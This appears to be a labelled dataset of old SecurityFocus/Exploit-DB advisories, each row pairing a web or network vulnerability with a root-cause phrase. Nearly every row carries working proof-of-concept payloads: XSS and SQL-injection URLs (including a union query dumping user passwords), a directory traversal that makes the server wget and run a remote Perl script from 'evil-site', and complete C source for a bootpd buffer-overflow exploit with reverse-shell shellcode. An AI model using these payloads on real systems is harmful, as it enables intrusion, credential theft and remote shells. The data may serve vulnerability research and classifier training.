31888,SchoolCenter 7.5 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/29591/info  SchoolCenter is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  http://www.example.com/education/components/docmgr/default.php?sectiondetailid=2179&fileitem=477&catfilter=XSS http://www.example.com/education/components/docmgr/default.php?sectiondetailid=#XSS http://www.example.com/education/components/scrapbook/default.php?sectiondetailid=#XSS http://www.example.com/education/district/district.php?sectiondetailid=#XSS http://www.example.com/education/admin/XSS http://www.example.com/education/components/XSS http://www.example.com/education/components/whatsnew/default.php?sectiondetailid=#XSS,fails to sufficiently sanitize user-supplied data,1
27146,sPaiz-Nuke - 'modules.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/16412/info  sPaiz-Nuke is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/sPaiz-Nuke/modules.php?name=Articles&file=search&query=[XSS]&type=articles&type=comments,a failure in the application to properly sanitize user-supplied input,1
30967,LiveCart 1.0.1 - 'email' Cross-Site Scripting source: https://www.securityfocus.com/bid/27087/info     LiveCart is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.     An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.     LiveCart 1.0.1 is vulnerable to these issues; other versions may also be affected.   http://www.example.com/user/remindComplete?email=XSS,fails to properly sanitize user-supplied input,1
25858,"DUware DUportal 3.4.3 Pro - Multiple SQL Injections source: https://www.securityfocus.com/bid/14029/info  DUportal Pro is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.  Some of these issues may have previously been discussed in BID 13285 and BID 13288.   http://www.example.com/DUportalPro34/Articles/default.asp?iChannel=2[SQL Inject]&nChannel=Articles http://www.example.com/DUportalPro34/Articles/detail.asp?iData=4[SQL Inject]&iCat=292&iChannel=2&nChannel=Articles http://www.example.com/DUportalPro34/home/members.asp?iMem=[SQL Inject] http://www.example.com/DUportalPro34/topics/cat.asp?iCat=4[SQL Inject]&iChannel=16&nChannel=Topics http://www.example.com/DUportalPro34/Polls/default.asp?iChannel=15[SQL Inject]&nChannel=Polls http://www.example.com/DUportalPro34/home/members.asp?iMem=[SQL Inject] http://www.example.com/DUportalPro34/admin/members_listing_approval.asp?offset=[SQL Inject] http://www.example.com/DUportalPro34/admin/channels_edit.asp?iChannel=7[SQL inject]&nChannel=[Name Module]",a failure in the application to properly sanitize user-supplied input before using it in SQL queries,1
27388,"MyBloggie 2.1.2/2.1.3 - 'delcat.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17048/info          MyBloggie is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.           An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/mybloggie213beta/admin.php?mode=delcat&cat_id=""><script>alert('xss_string')</script>",a failure in the application to properly sanitize user-supplied input,1
23273,"Microsoft Internet Explorer 6 - Scrollbar-Base-Color Partial Denial of Service source: https://www.securityfocus.com/bid/8874/info  It has been reported that Microsoft Internet Explorer is prone to a vulnerability that may allow an attacker to cause a denial of service condition in the software. The problem occurs due to improper handling of scrollbar-base-color attribute of the div object.  Successful exploitation of this issue may allow an attacker to create a webpage containing malicious script code that would cause a user's browser to crash upon visiting the site.  Microsoft Internet Explorer 6.0 has been reported to be vulnerable to this issue, however other versions may be affected as well.  <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.01 Transitional//EN""> <html> <head> <title>CRASH-IE</title> <style type=""text/css""> html, body { overflow-y: hidden; scrollbar-base-color: '#330066'; }  .crash { position:absolute; left:200px; top:200px; width:200px; }  </style> <script type=""text/javascript""> function galgenfrist() { window.setTimeout('crashIE();',1000); }  function crashIE() { var moveNode = document.getElementById(""move""); if(moveNode) { moveNode.style.top = ""100px""; moveNode.style.left = ""200px""; } } </script> </head> <body onload=""galgenfrist();""> <h1>CRASH-IE</h1> <div id=""move"" class=""crash""> <table> <tbody> <tr> <td> <textarea>&lt;/textarea&gt; </td> </tr> </tbody> </table> </div> </body> </html>",improper handling of scrollbar-base-color attribute of the div object,1
25669,"pserv 3.2 - Directory Traversal source: https://www.securityfocus.com/bid/13642/info  pServ is prone to a directory traversal vulnerability. This occurs because the application does not implement a proper method for filtering directory traversal sequences from URIs. Since this can be done from the cgi-bin directory, it is possible to execute commands to which the Web server has permission.  This issue was reported to affect pServ version 3.2; earlier versions are like vulnerable.   The following url downloads a script (or executable) to the server: http://www.example.com:2000/cgi-bin///////////../../../../../../../../usr/bin/wget?-q+http://evil-site/evil.pl/+-O+/tmp/evil.pl  This is how the script can be executed afterwards: http://www.example.com:2000/cgi-bin///////////../../../../../../../../usr/bin/perl?/tmp/evil.pl",the application does not implement a proper method for filtering directory traversal sequences from URIs,1
36833,Endian Firewall 2.4 - 'dansguardian.cgi?addrule' Cross-Site Scripting source: https://www.securityfocus.com/bid/52076/info    Endian Firewall is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.    Exploiting these issues could allow an attacker to execute arbitrary script on the affected server and steal cookie-based authentication credentials. Other attacks are also possible.    https://www.example.com/cgi-bin/dansguardian.cgi#addrule[XSS],fails to sufficiently sanitize user-supplied data,1
32655,"Multiple Ad Server Solutions Products - 'logon_processing.jsp' SQL Injection source: https://www.securityfocus.com/bid/32782/info  Multiple Ad Server Solutions products are prone to SQL-injection vulnerabilities because they fail to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  The following Ad Server Solutions products are vulnerable:  Ad Management Software Affiliate Software   The following example data is available:  username: r0' or ' 1=1-- password: r0' or ' 1=1--",fail to sufficiently sanitize user-supplied data before using it in an SQL query,1
35723,"TCExam 11.1.29 - 'tce_xml_user_results.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/47762/info  TCExam is prone to multiple SQL-injection vulnerabilities because it fails to properly sanitize user-supplied input before using it in an SQL query.  A successful exploit could allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.  TCExam 11.1.029 is vulnerable; other versions may also be affected.   http://www.example.com/tcexam/admin/code/tce_xml_user_results.php?lang=&user_id=1&startdate=[SQL]&enddate=[SQL]&order_field=[SQL]",fails to properly sanitize user-supplied input before using it in an SQL query,1
26849,ECTOOLS Onlineshop 1.0 - Cross-Site Scripting source: https://www.securityfocus.com/bid/15891/info  ECTOOLS Onlineshop is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/cart.cgi?action=link&product=%22%3E%3Cscri pt%3Ealert('r0t')%3C/script%3E  http://www.example.com/cart.cgi?action=search&category=%22%3E%3Cs cript%3Ealert('r0t')%3C/script%3E  http://www.example.com/cart.cgi?action=link&product=33&uid=%22%3E %3Cscript%3Ealert('r0t')%3C/script%3E,a failure in the application to properly sanitize user-supplied input,1
22819,"Tutos 1.1 - File_New Arbitrary File Upload source: https://www.securityfocus.com/bid/8012/info  It has been reported that Tutos does not properly handle input to the file_new script. Because of this, an attacker may be able to upload arbitrary files to a vulnerable site.  We can upload via http://www.example.com/tutos/file/file_new.php?link_id=1065  The path is http://www.example.com/tutos/repository/[project number]/[file number]/FILE",Tutos does not properly handle input to the file_new script,1
29104,"vSpin Classified System 2004 - 'search.asp' Multiple SQL Injections source: https://www.securityfocus.com/bid/21190/info   vSpin Classified System is prone to multiple input-validation vulnerabilities, including SQL-injection and cross-site scripting issues, because the application fails to sufficiently sanitize user-supplied data.   Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database implementation.   http://www.example.com/search.asp?in=y&keyword='[sql] http://www.example.com/search.asp?in=y&keyword=1&submit=Search&order='[sql] http://www.example.com/search.asp?in=y&keyword=1&submit=Search&order=tbl_classads.col_id&sort='[sql] http://www.example.com/search.asp?in=y&keyword=1&submit=Search&order=tbl_classads.col_id&sort=DESC&cat=0&menuSelect='[sql] http://www.example.com/search.asp?in=y&keyword=1&submit=Search&order=tbl_classads.col_id&sort=DESC&cat=0&menuSelect=1&type=1&city=1&minprice=1&maxprice=1&state='[sql]",the application fails to sufficiently sanitize user-supplied data,1
30957,"PHCDownload 1.1 - 'search.php?string' SQL Injection source: https://www.securityfocus.com/bid/27066/info  PHCDownload is prone to an SQL-injection and cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks. Attackers may also exploit this issue to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  PHCDownload 1.1.0 is vulnerable; other versions may also be affected.   http://www.example.com/[phcdownload/search.php?string='",fails to properly sanitize user-supplied input,1
19256,"Stanford University bootpd 2.4.3 / Debian 2.0 - netstd // source: https://www.securityfocus.com/bid/324/info  The netstd package, included with the Debian GNU/Linux distribution is vulnerable to two buffer overflow attacks. The first is in the bootp server, the second in the FTP client.  Bootpd version 2.4.3(and earlier) is prone to a number of buffer overflow conditions that may allow a remote attacker to fully compromise a host running a vulnerable version. This is due to improper bounds checking in the handling of the boot file/location specified in a bootp request packet, and in the error logging facility. This vulnerability is specific to the bootp daemon and any Unix distributions that ship with the affected version should be considered vulnerable.  A buffer overflow condition also exists in the netstd FTP client, which may be exploited by a local attacker to potentially elevate privileges.  /*  * Bootpd Exploit against debian linux 1.3 and 2.0 and possibly other  *  * (C) 1998  Willem Pinckaers W.H.J.Pinckaers@cpedu.rug.nl  *  */  #include <netinet/in.h> #include <sys/socket.h> #include <sys/types.h> #include <stdio.h> #include <stdlib.h> #include <unistd.h>  #include ""bootp.h""  char shellcode[] = ""\x31"" ""\xc9"" ""\x89"" ""\xc8"" ""\x04"" ""\x66"" ""\x41"" ""\x89"" ""\xca"" ""\x89"" ""\xcb"" ""\xeb"" ""\x7f"" ""\x5f"" ""\x89"" ""\x4f"" ""\x08"" ""\x41"" ""\x89"" ""\x4f"" ""\x04"" ""\x80"" ""\xc1"" ""\x04"" ""\x89"" ""\x4f"" ""\x0c"" ""\x8d"" ""\x4f"" ""\x04"" ""\xcd"" ""\x80"" ""\x89"" ""\x07"" ""\x31"" ""\xc9"" ""\x80"" ""\xc1"" ""\x02"" ""\x66"" ""\x89"" ""\x4f"" ""\x0c"" ""\x66"" ""\x89"" ""\x4f"" ""\x0e"" ""\x80"" ""\xc1"" ""\x0e"" ""\x66"" ""\x89"" ""\x4f"" ""\x08"" ""\x66"" ""\xb9"" ""\x30"" ""\x39"" ""\x66"" ""\x89"" ""\x4f"" ""\x0e"" ""\x8d"" ""\x47"" ""\x0c"" ""\x89"" ""\x47"" ""\x04"" ""\x31"" ""\xc9"" ""\xb1"" ""\x03"" ""\x89"" ""\xca"" ""\x89"" ""\xcb"" ""\x89"" ""\xf9"" ""\x31"" ""\xc0"" ""\x04"" ""\x66"" ""\xcd"" ""\x80"" ""\x31"" ""\xc0"" ""\x89"" ""\xc1"" ""\x04"" ""\x3f"" ""\x89"" ""\xc2"" ""\x8b"" ""\x1f"" ""\xcd"" ""\x80"" ""\x89"" ""\xd0"" ""\x41"" ""\xcd"" ""\x80"" ""\x89"" ""\xd0"" ""\x41"" ""\xcd"" ""\x80"" ""\x31"" ""\xc0"" ""\x89"" ""\x47"" ""\x10"" ""\x88"" ""\x47"" ""\x1b"" ""\x8d"" ""\x47"" ""\x14"" ""\x89"" ""\x47"" ""\x0c"" ""\x31"" ""\xc0"" ""\x04"" ""\x0b"" ""\x8d"" ""\x5f"" ""\x14"" ""\x8d"" ""\x4f"" ""\x0c"" ""\x8d"" ""\x57"" ""\x10"" ""\xcd"" ""\x80"" ""\x31"" ""\xc0"" ""\x40"" ""\xcd"" ""\x80"" ""\xe8"" ""\x7c"" ""\xff"" ""\xff"" ""\xff"" ""\x2e"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x41"" ""\x39"" ""\x30"" ""\xc0"" ""\xa8"" ""\x01"" ""\x01"" ""\x2f"" ""\x62"" ""\x69"" ""\x6e"" ""\x2f"" ""\x73"" ""\x68"" ""\x00"";  #define SERVER_PORT     67  char client_addr[16] = ""127.000.000.001""; char host_addr[16] = ""127.000.000.001""; int realpath_adjust = 0; int exploit_length = 1200;   struct sockaddr_in server_addr; void sendpacket(int, struct bootp *); void build_packet(struct bootp *, int, char**); void get_args(int, char**); void usage(void);  int main(int argc, char *argv[]) {     struct bootp* bp;     int s;      get_args(argc, argv);      server_addr.sin_family = AF_INET;     server_addr.sin_port = htons(SERVER_PORT);     server_addr.sin_addr.s_addr = inet_addr(host_addr);       if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {         fprintf(stderr, ""cannot create socket\n"");         exit(1);     }     if ((bp = (struct bootp*) malloc(MAX_MSG_SIZE + 1000)) == NULL) {         (void) fprintf(stderr, ""Cannot malloc.\n"");         exit(1);     };     (void) memset(bp, 0, MAX_MSG_SIZE + 1000); /* ai exploit isn't secure */     build_packet(bp, argc, argv);      sendpacket(s, bp); }  void sendpacket(int s, struct bootp *bp) {     if (sendto(s, (const void *) bp, MAX_MSG_SIZE, 0,       (const struct sockaddr *) &server_addr,       sizeof(struct sockaddr_in)) == -1) {         fprintf(stderr, ""sendpacket: sendto returned -1 ;(\n"");         exit(1);     } }  void build_packet(struct bootp *bp, int argc, char *argv[]) {     unsigned long start_realpath = 0xbffff684 + realpath_adjust;     unsigned long addr_ret_addr = start_realpath + 8 + 0x488;     unsigned long temp_addr, temp_addr2 = 0;     int length_tftpdir = 1;    // no ftpdir just a slash at the start..     int num_nops = 600;     char *p;     unsigned long *q;     int i;      bp->bp_op = BOOTREQUEST;     bp->bp_xid = 58524;     bp->bp_htype = HTYPE_ETHERNET;     bp->bp_hlen = 6;     bp->bp_ciaddr.s_addr = inet_addr(client_addr);      printf(""Using: client: %s\n"", client_addr);     printf(""Using: server: %s\n"", host_addr);     printf(""Addr of realpath: %x\n"", start_realpath);     p = bp->bp_file; /* Putting in nops */     for (i = 0; i < num_nops; i++)         *p++ = 0x90;     printf(""Added: %d nops\n"", num_nops);  /* Putting in shellcode */     for(i = 0; i < strlen(shellcode); i++)         *p++ = shellcode[i];     printf(""%d bytes of shellcode added.\n"", strlen(shellcode));  /* Aligning to make sure the ret_addr is placed correctly */     temp_addr = p - bp->bp_file + length_tftpdir + start_realpath;     for(i = 0; i < (addr_ret_addr - temp_addr) % 4; i++)         *p++ = 'a';     printf(""%d bytes of alignment added.\n"", (addr_ret_addr - temp_addr) %4);  /* set return adress.. hopefully in exploit code.... */     temp_addr2 = start_realpath + length_tftpdir + (num_nops / 2);     if (!(temp_addr2 & 0xff)) temp_addr2++;     printf(""Setting return addr to: %x \n"", temp_addr2);     q = (unsigned long *) p;     do {         *q++ = temp_addr2;         p = (char *) q;     } while ((p - bp->bp_file) < exploit_length);     *p++ = '\0';    printf(""Exploit length: %d"", strlen(bp->bp_file)); }  void get_args(int argc, char *argv[]) {     int ch;     while ((ch = getopt(argc, argv, ""c:s:a:e:"")) != EOF) {         switch(ch) {             case 'c':                 strcpy(client_addr, optarg);                 break;             case 's':                 strcpy(host_addr, optarg);                 break;             case 'a':                 realpath_adjust = atoi(optarg);                 break;             case 'e':                 exploit_length = atoi(optarg);                 break;             default:                 usage();         }     } }  void usage(void) {     printf(""bootpd exploit against debian linux 1.3 and 2.0 (probably others)\n"");     printf(""\nBy Willem Pinckaers (W.H.J.Pinckaers@cpedu.rug.nl) 1998\n"");     printf(""\nUsage:\n\tbootpd: -c client_addr -s server_addr -a offset\n"");     exit(1); } --------- CUT HERE --------- --------- CUT HERE --------- /*  * Exploit code, casts a shell to a remote host  * (C) 1998 Willem Pinckaers (W.H.J.Pinckaers@cpedu.rug.nl  */ void main() {     __asm__(""                 xorl %ecx, %ecx                 movl %ecx, %eax                 addb $0x66, %al                 incl %ecx                 movl %ecx, %edx                 movl %ecx, %ebx                 jmp endc0de                 realstart:                 popl %edi                 movl %ecx,0x08(%edi)                 incl %ecx                 movl %ecx,0x04(%edi)                 addb $04,%cl                 movl %ecx,0x0c(%edi)                 leal 04(%edi), %ecx                 int $0x80                 movl %eax, (%edi)                 xorl %ecx, %ecx                 addb $02, %cl                 movw %cx, 0xc(%edi)                 movw %cx, 0xe(%edi)                 addb $0x0e, %cl                 movw %cx, 0x8(%edi)                 movw $0x3930, %cx                 movw %cx, 0xe(%edi)                 leal 0x0c(%edi), %eax                 movl %eax, 0x04(%edi)                 xorl %ecx, %ecx                 movb $03, %cl                 movl %ecx, %edx                 movl %ecx, %ebx                 movl %edi, %ecx                 xorl %eax, %eax                 addb $0x66, %al                 int $0x080              // connect                 xorl %eax,%eax                 movl %eax, %ecx                 addb $0x3f, %al                 movl %eax, %edx                 movl (%edi), %ebx                 int $0x80               // dup2                 movl %edx, %eax                 incl %ecx                 int $0x80               // dup2                 movl %edx, %eax                 incl %ecx                 int $0x80               // dup2                 xorl %eax, %eax                 movl %eax, 0x10(%edi)           // pointer = NULL                 movb %al, 0x1b(%edi)            // terminate /bin/sh                 leal 0x14(%edi), %eax           // start van /bin/sh                 movl %eax, 0x0c(%edi)                 xorl %eax, %eax                 addb $0x0b, %al                 leal 0x14(%edi), %ebx                 leal 0x0c(%edi), %ecx                 leal 0x10(%edi), %edx                 int $0x80                       // execve                 xorl %eax,%eax                 incl %eax                 int $0x80                 endc0de:                 call realstart                 sockfd:                 .byte 0x2e, 'A', 'A', 'A'                 .byte 'A', 'A', 'A', 'A'                 .byte 'A', 'A', 'A', 'A'                 sockaddr:                 .byte 'A', 'A'                  // must contain 02                 .byte 0x39, 0x30                // must contain port nr                 .byte 192, 168, 01, 01          // must contain ip                 .string \""/bin/sh\""""); }","improper bounds checking in the handling of the boot file/location specified in a bootp request packet, and in the error logging facility",1
33684,"Blax Blog 0.1 - 'girisyap.php' SQL Injection source: https://www.securityfocus.com/bid/38465/info  Blax Blog is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Blax Blog 0.1 is vulnerable; other versions may also be affected.   http://www.example.com/admin/girisyap.php  Username: ' or '1=1 password: ' or '1=1",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
37583,"YT-Videos Script - 'id' SQL Injection source: https://www.securityfocus.com/bid/54859/info  YT-Videos Script is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/demo/ytvideos/play.php?id=2'",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
35575,PrestaShop 1.3.6 - 'cms.php' Remote File Inclusion source: https://www.securityfocus.com/bid/47264/info  PrestaShop is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied input.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  PrestaShop 1.3.6 and prior are vulnerable; other versions may also be affected.  http://www.example.com/[path]/cms.php?rewrited_url=http://[Shell-Path],fails to sufficiently sanitize user-supplied input,1
31720,QT-cute QuickTalk Guestbook 1.6 - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/29013/info  QT-cute QuickTalk Guestbook is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  QuickTalk Guestbook 1.6 is vulnerable; other versions may also be affected.  http://www.example.com/quicktalk/qtf_cmd.php?a=[XSS] http://www.example.com/quicktalk/qtf_ind_search_kw.php?title=[XSS] http://www.example.com/quicktalk/qtf_ind_search_ov.php?a=[XSS] http://www.example.com/quicktalk/qtf_ind_search_ov.php?a=user&id=2&n=[XSS] http://www.example.com/quicktalk/qtf_ind_search_ov.php?a=user&id=[XSS] http://www.example.com/quicktalk/qtf_ind_search_kw.php?title=adasdasdadasda&f=-1&al=0&at=0&s=[XSS] http://www.example.com/quicktalk/qtf_ind_stat.php?y=[XSS] http://www.example.com/quicktalk/qtf_ind_post.php?f=1&t=1[XSS] http://www.example.com/quicktalk/qtf_adm_cmd.php?a=[XSS],fails to properly sanitize user-supplied input,1
31367,"Batchelor Media BM Classifieds - Multiple SQL Injections source: https://www.securityfocus.com/bid/28159/info  BM Classifieds is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/showad.php?listingid=xCoRpiTx&cat=-99/**/union+select/**/concat(username,0x3a,email),password,2/**/from/**/users/* http://www.example.com/pfriendly.php?ad=-99%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0,1,concat(username,0x3a,email),password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
30158,Joomla! Component JD-Wiki 1.0.2 - 'wantedpages.php?MosConfig_absolute_path' Remote File Inclusion source: https://www.securityfocus.com/bid/24342/info   JD-Wiki is prone to multiple remote file-include vulnerabilities because it fails to properly sanitize user-supplied input.   An attacker can exploit these issues to include arbitrary remote files containing malicious PHP code and execute it in the context of the webserver process. This may allow the attacker to compromise the application and to gain access to the underlying system.   JD-Wiki 1.0.2 and earlier versions are vulnerable to this issue; other versions may also be affected.   http://www.example.com/components/com_jd-wiki/bin/wantedpages.php?mosConfig_absolute_path=,fails to properly sanitize user-supplied input,1
